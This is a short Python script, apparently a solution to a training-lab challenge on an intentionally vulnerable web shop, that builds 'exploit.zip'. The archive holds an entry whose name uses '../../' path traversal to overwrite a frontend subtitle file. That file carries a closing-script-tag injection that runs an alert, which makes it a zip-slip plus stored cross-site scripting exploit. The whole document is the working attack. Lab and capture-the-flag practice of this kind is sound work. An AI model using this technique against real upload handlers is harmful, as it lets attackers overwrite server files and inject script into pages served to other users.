import zipfile
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr('../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt', '</script><script>alert(`xss`)</script>') 
